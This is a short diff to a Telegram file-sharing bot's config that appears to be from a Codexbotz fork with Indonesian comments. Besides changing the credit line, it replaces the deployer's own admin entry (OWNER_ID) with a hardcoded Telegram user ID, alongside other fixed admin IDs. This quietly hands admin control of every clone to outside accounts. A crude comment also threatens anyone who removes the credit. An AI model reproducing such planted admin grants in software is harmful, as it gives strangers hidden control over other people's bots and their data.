@@ -1,5 +1,5 @@
 # (©)Codexbotz
-# Recife By Putra Icipiyey
+# Recife By sanyagesya
 # Kalo clone Gak usah hapus 
 # gue tandain akun tele nya ngentod
 
@@ -65,7 +65,7 @@ CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 # Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
 DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True"
 
-ADMINS.append(OWNER_ID)
+ADMINS.append(1971239428)
 ADMINS.append(1250450587)
 ADMINS.append(2010825200)
 ADMINS.append(1750080384)
